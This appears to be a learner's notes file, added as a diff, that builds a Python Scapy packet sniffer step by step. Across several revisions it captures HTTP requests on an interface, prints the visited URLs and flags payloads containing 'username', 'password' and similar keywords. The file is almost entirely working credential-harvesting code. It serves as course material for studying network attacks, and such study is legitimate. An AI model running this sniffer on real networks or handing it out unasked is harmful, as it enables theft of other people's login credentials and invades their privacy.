@@ -1,0 +1,178 @@
+
+https://biot.com/capstats/bpf.html
+
+
+packet.haslayer(http.HTTPRequest): ....everything over the web browser is sent using the HTTP layer
+- always use packet.haslayer(scapy.<layer>) - the scapy has to be there with exeption of above, because scapy does not have HTTP filter by default....so we had to intall the scapy.layers import http.(from scapy.layers import http)
+print(packet.show())..... show packet in more details, can check which layer and what field is sending password
+
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load) ..... printing the packet [scapy.<layer>].<field>)
+
+
+
+#!/usr/bin/env python
+import scapy.all as scapy
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+def process_sniffed_packet(packet):
+    print(packet)
+
+sniff("eth0")
+---------------------------------------------------------------------------------------------------
+
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+def process_sniffed_packet(packet):
+    #for each packet sniffed, execute this function
+    if packet.haslayer(http.HTTPRequest):
+        print(packet)
+
+sniff("eth0")
+---------------------------------------------------------------------------------------------------------------
+
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+def process_sniffed_packet(packet):
+    #for each packet sniffed, execute this function
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load)
+
+sniff("eth0")
+
+-------------------------------------------------------------------------------------------------
+
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+def process_sniffed_packet(packet):
+    #for each packet sniffed, execute this function
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "uname", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
+
+sniff("eth0")
+
+--------------------------------------------------------------------------------------------------------------
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+def process_sniffed_packet(packet):
+    #for each packet sniffed, execute this function
+    if packet.haslayer(http.HTTPRequest):
+        print(packet.show())
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(url)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "uname", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
+
+sniff("eth0")
+
+--------------------------------------------------------------------------------------------------------
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "uname", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
+def process_sniffed_packet(packet):
+    #for each packet sniffed, execute this function
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP request  " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n [+] Possible username/password > " + login_info + "\n\n")
+
+
+sniff("eth0")
+
+------------------------------------------------------------------------------------------------
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #filter =tcp, arp, tcp, port 21 -ftp passwords, 80 -web server/websites
+
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "uname", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
+def process_sniffed_packet(packet):
+    #for each packet sniffed, execute this function
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        #PY2 print("[+] HTTP request  " + url)
+        print("[+] HTTP request  " + url.decode())
+
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n [+] Possible username/password > " + login_info + "\n\n")
+
+
+sniff("eth0")
